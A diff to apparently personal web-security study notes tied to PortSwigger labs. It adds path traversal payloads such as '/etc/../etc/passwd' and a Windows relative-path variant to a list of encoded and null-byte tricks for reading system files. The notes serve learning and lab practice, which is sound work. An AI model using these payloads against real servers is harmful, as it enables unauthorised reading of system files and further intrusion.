@@ -204,6 +204,10 @@ https://portswigger.net/web-security/os-command-injection#useful-commands
   - Double URL Encode: `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`
 - [Start Path](../port-swigger/path-traversal.md#lab-file-path-traversal-validation-of-start-of-path): `/var/www/images/../../../etc/passwd`
 - [Null Byte](../port-swigger/path-traversal.md#lab-file-path-traversal-validation-of-file-extension-with-null-byte-bypass): `../../../etc/passwd%00.jpg`
+- `/etc/./passwd`
+- `/etc/../etc/passwd`
+- `/etc/../ETC/passwd`
+- Windows: `non-exist-dir/../../../file.txt`
 
 ## Access control
 
